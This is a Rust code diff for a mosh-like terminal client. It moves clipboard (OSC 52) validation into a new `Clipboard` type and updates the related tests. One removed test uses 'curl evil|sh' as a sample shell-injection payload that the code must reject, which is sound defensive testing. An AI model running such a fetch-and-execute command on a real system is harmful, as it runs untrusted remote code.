@@ -7,7 +7,7 @@ use std::io;
 
 use super::backend::{CellStyle, KohBackend};
 use crate::predict::Overlay;
-use crate::terminal::{Grid, Link, Size, MAXIMUM_CLIPBOARD_SIZE};
+use crate::terminal::{Clipboard, Grid, Link, Size};
 use fux_vt::{
     Blink, CellRef, Cells, Color, MouseProtocolEncoding, MouseProtocolMode, UnderlineStyle,
 };
@@ -640,19 +640,12 @@ fn sanitize_osc(t: &str) -> String {
     t.chars().filter(|c| !c.is_control()).collect()
 }
 
-/// Whether `s` is non-empty base64, as a clipboard set must be to be forwarded.
-fn is_base64_payload(s: &str) -> bool {
-    !s.is_empty()
-        && s.bytes()
-            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='))
-}
-
 /// The window state the client mirrors beside the grid: title, icon, clipboard and bell count.
 #[derive(Clone, Copy)]
 pub struct WindowState<'a> {
     pub title: &'a str,
     pub icon: &'a str,
-    pub clipboard: &'a str,
+    pub clipboard: &'a Clipboard,
     pub bell_count: u64,
 }
 
@@ -783,7 +776,7 @@ pub(super) struct OutOfBand {
     title_initialized: bool,
     last_title: String,
     last_icon: String,
-    last_clipboard: String,
+    last_clipboard: Clipboard,
     last_bell: u64,
     /// Previous frame's input modes, to diff against the current frame.
     prev_modes: Option<InputModes>,
@@ -821,14 +814,11 @@ impl OutOfBand {
         win: WindowState<'_>,
     ) -> io::Result<()> {
         self.emit_window_title(backend, win.title, win.icon)?;
-        // Only if opted in, and only base64 within the cap.
-        if self.clipboard_enabled && win.clipboard != self.last_clipboard {
-            self.last_clipboard = win.clipboard.to_string();
-            if !win.clipboard.is_empty()
-                && win.clipboard.len() <= MAXIMUM_CLIPBOARD_SIZE
-                && is_base64_payload(win.clipboard)
-            {
-                backend.set_clipboard(win.clipboard)?;
+        // Only if opted in; a `Clipboard` is base64 within the cap.
+        if self.clipboard_enabled && *win.clipboard != self.last_clipboard {
+            self.last_clipboard = win.clipboard.clone();
+            if !win.clipboard.is_empty() {
+                backend.set_clipboard(win.clipboard.as_str())?;
             }
         }
         // One bell however many rang.
@@ -925,13 +915,22 @@ mod tests {
     }
 
     /// Build a `WindowState` for tests.
-    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
+    fn win<'a>(
+        title: &'a str,
+        icon: &'a str,
+        clipboard: &'a Clipboard,
+        bell: u64,
+    ) -> WindowState<'a> {
         WindowState {
             title,
             icon,
             clipboard,
             bell_count: bell,
         }
+    }
+
+    fn hello() -> Clipboard {
+        Clipboard::new(b"aGVsbG8=").unwrap()
     }
 
     /// Run one `OutOfBand::emit` into a fresh capture backend and return the emitted bytes.
@@ -948,22 +947,30 @@ mod tests {
         let scr = screen_of(b"");
 
         // Empty title/icon before the shell sets one: never blank the user's terminal title.
-        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &Clipboard::NONE, 0));
         assert!(
             !String::from_utf8_lossy(&buf).contains("\x1b]"),
             "no OSC for an unset title"
         );
 
         // A real title (icon == title) is emitted as the combined OSC 0.
-        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
+        let buf = oob_emit(
+            &mut oob,
+            &scr,
+            win("vim - file.rs", "vim - file.rs", &Clipboard::NONE, 0),
+        );
         assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim - file.rs\x07"));
 
         // Unchanged → not re-emitted.
-        let buf = oob_emit(&mut oob, &scr, win("vim - file.rs", "vim - file.rs", "", 0));
+        let buf = oob_emit(
+            &mut oob,
+            &scr,
+            win("vim - file.rs", "vim - file.rs", &Clipboard::NONE, 0),
+        );
         assert!(!String::from_utf8_lossy(&buf).contains("\x1b]0;"));
 
         // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
-        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &Clipboard::NONE, 0));
         assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;\x07"));
     }
 
@@ -972,7 +979,11 @@ mod tests {
         let mut oob = OutOfBand::default();
         let scr = screen_of(b"");
         // Distinct icon name + title → ESC]1;<icon> then ESC]2;<title> (mosh).
-        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
+        let buf = oob_emit(
+            &mut oob,
+            &scr,
+            win("the title", "the-icon", &Clipboard::NONE, 0),
+        );
         let s = String::from_utf8_lossy(&buf);
         assert!(s.contains("\x1b]1;the-icon\x07"), "icon OSC 1, got {s:?}");
         assert!(s.contains("\x1b]2;the title\x07"), "title OSC 2, got {s:?}");
@@ -984,7 +995,7 @@ mod tests {
         let scr = screen_of(b"");
 
         // icon == title: the prefix is applied to both, and the combined OSC 0 carries it.
-        let buf = oob_emit(&mut oob, &scr, win("vim", "vim", "", 0));
+        let buf = oob_emit(&mut oob, &scr, win("vim", "vim", &Clipboard::NONE, 0));
         assert!(
             String::from_utf8_lossy(&buf).contains("\x1b]0;[koh] vim\x07"),
             "combined title is prefixed, got {:?}",
@@ -994,7 +1005,11 @@ mod tests {
         // icon != title: only the title (OSC 2) is prefixed; the icon (OSC 1) is left untouched,
         // mirroring mosh's prefix_window_title (which preserves equivalence but doesn't prefix a
         // distinct icon name).
-        let buf = oob_emit(&mut oob, &scr, win("the title", "the-icon", "", 0));
+        let buf = oob_emit(
+            &mut oob,
+            &scr,
+            win("the title", "the-icon", &Clipboard::NONE, 0),
+        );
         let s = String::from_utf8_lossy(&buf);
         assert!(
             s.contains("\x1b]1;the-icon\x07"),
@@ -1010,7 +1025,11 @@ mod tests {
     fn out_of_band_default_has_no_title_prefix() {
         // The Default constructor (used by tests and the no-prefix opt-out) adds nothing.
         let mut oob = OutOfBand::default();
-        let buf = oob_emit(&mut oob, &screen_of(b""), win("vim", "vim", "", 0));
+        let buf = oob_emit(
+            &mut oob,
+            &screen_of(b""),
+            win("vim", "vim", &Clipboard::NONE, 0),
+        );
         assert!(String::from_utf8_lossy(&buf).contains("\x1b]0;vim\x07"));
     }
 
@@ -1019,7 +1038,7 @@ mod tests {
         // With clipboard writes off (`--no-clipboard`), no OSC 52 reaches the terminal even though
         // the clipboard changed.
         let mut oob = OutOfBand::default().with_clipboard(false);
-        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "aGVsbG8=", 0));
+        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", &hello(), 0));
         assert!(
             !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
             "no OSC-52 with clipboard writes off, got {:?}",
@@ -1031,38 +1050,13 @@ mod tests {
     fn out_of_band_forwards_clipboard_when_on() {
         let mut oob = OutOfBand::default().with_clipboard(true);
         let scr = screen_of(b"");
-        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &hello(), 0));
         assert!(
             String::from_utf8_lossy(&buf).contains("\x1b]52;c;aGVsbG8=\x07"),
             "clipboard OSC 52 forwarded when on"
         );
         // Same clipboard again → not re-emitted.
-        let buf = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 0));
-        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
-    }
-
-    #[test]
-    fn out_of_band_rejects_non_base64_clipboard_even_when_on() {
-        // Even with clipboard writes on, a non-base64 payload (e.g. raw shell injection) is dropped, not
-        // written verbatim to the terminal.
-        let mut oob = OutOfBand::default().with_clipboard(true);
-        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "curl evil|sh", 0));
-        assert!(
-            !String::from_utf8_lossy(&buf).contains("\x1b]52;"),
-            "a non-base64 clipboard payload is rejected, got {:?}",
-            String::from_utf8_lossy(&buf)
-        );
-    }
-
-    #[test]
-    fn a_clipboard_query_or_an_oversized_payload_is_never_forwarded() {
-        // A query (`OSC 52 ; c ; ?`) would ask the user's terminal for their clipboard; it is not
-        // base64, so it never reaches the terminal, and nothing is ever asked of it.
-        let mut oob = OutOfBand::default().with_clipboard(true);
-        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", "?", 0));
-        assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
-        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
-        let buf = oob_emit(&mut oob, &screen_of(b""), win("", "", &huge, 0));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &hello(), 0));
         assert!(!String::from_utf8_lossy(&buf).contains("\x1b]52;"));
     }
 
@@ -1071,14 +1065,14 @@ mod tests {
         let mut oob = OutOfBand::default();
         let scr = screen_of(b"");
         // Establish the mode baseline (so later emits don't also carry mode bytes).
-        let _ = oob_emit(&mut oob, &scr, win("", "", "", 0));
+        let _ = oob_emit(&mut oob, &scr, win("", "", &Clipboard::NONE, 0));
 
         // No increase → no bell.
-        let buf = oob_emit(&mut oob, &scr, win("", "", "", 0));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &Clipboard::NONE, 0));
         assert!(buf.is_empty(), "no bell when the count is unchanged");
 
         // Count climbs (possibly by more than one) → exactly one bell.
-        let buf = oob_emit(&mut oob, &scr, win("", "", "", 3));
+        let buf = oob_emit(&mut oob, &scr, win("", "", &Clipboard::NONE, 3));
         assert_eq!(buf, b"\x07", "one bell on an increase, even if it jumped");
     }
 
@@ -1086,11 +1080,11 @@ mod tests {
     fn out_of_band_reasserts_input_modes_on_change() {
         let mut oob = OutOfBand::default();
         // Baseline frame in default modes.
-        let _ = oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));
+        let _ = oob_emit(&mut oob, &screen_of(b""), win("", "", &Clipboard::NONE, 0));
 
         // The remote turns on mouse reporting → the real terminal reports the mouse, in SGR.
         let modes = screen_of(b"\x1b[?2004h\x1b[?1000h\x1b[?1005h");
-        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
+        let buf = oob_emit(&mut oob, &modes, win("", "", &Clipboard::NONE, 0));
         assert_eq!(buf, b"\x1b[?1000h\x1b[?1006h");
     }
 
